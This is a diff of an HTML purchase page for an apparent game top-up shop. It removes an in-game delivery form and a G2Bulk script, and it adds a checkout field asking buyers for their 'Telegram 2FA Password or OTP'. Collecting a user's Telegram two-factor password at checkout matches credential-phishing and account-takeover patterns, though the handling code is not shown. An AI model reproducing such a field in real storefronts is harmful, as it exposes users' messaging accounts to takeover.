@@ -324,20 +324,6 @@
                 <div class="input-summary" id="input-summary">
                     <!-- Input values summary -->
                 </div>
-                <!-- In-Game Delivery Section (for G2Bulk products) -->
-                <div class="ingame-section" id="ingame-section" style="display: none; margin: 15px 0; padding: 15px; background: rgba(139, 92, 246, 0.1); border-radius: 8px;">
-                    <h4 style="margin-top: 0; color: #8b5cf6;"><i class="fas fa-gamepad"></i> In-Game Delivery</h4>
-                    <div style="display: flex; gap: 10px;">
-                        <div style="flex: 1;">
-                            <label>Player ID</label>
-                            <input type="text" id="player-id" placeholder="Enter your game ID" style="width: 100%; padding: 8px; border: 1px solid rgba(255,255,255,0.1); border-radius: 4px; background: rgba(255,255,255,0.05); color: white;" required>
-                        </div>
-                        <div style="flex: 1;">
-                            <label>Player Name</label>
-                            <input type="text" id="player-name" placeholder="Your in-game name" style="width: 100%; padding: 8px; border: 1px solid rgba(255,255,255,0.1); border-radius: 4px; background: rgba(255,255,255,0.05); color: white;">
-                        </div>
-                    </div>
-                </div>
                 <div class="price-breakdown">
                     <div class="price-row">
                         <span>Product Price</span>
@@ -351,6 +337,13 @@
                         <span>After Purchase</span>
                         <span id="modal-remaining">0 MMK</span>
                     </div>
+                </div>
+                <div class="verification-section" id="verification-section">
+                    <label>Enter Telegram 2FA Password or OTP</label>
+                    <input type="password" id="verification-code" placeholder="Enter verification code">
+                    <button class="send-otp-btn" onclick="sendOTP()">
+                        <i class="fas fa-sms"></i> Send OTP
+                    </button>
                 </div>
                 <button class="confirm-buy-btn" onclick="confirmPurchase()" id="confirm-buy-btn">
                     <i class="fas fa-check"></i> Confirm Purchase
@@ -376,7 +369,6 @@
     <script src="js/config.js"></script>
     <script src="js/utils.js"></script>
     <script src="js/database.js"></script>
-    <script src="js/g2bulk.js"></script>
     <script src="js/telegram.js"></script>
     <script src="js/app.js"></script>
     <!-- Cookie Consent -->
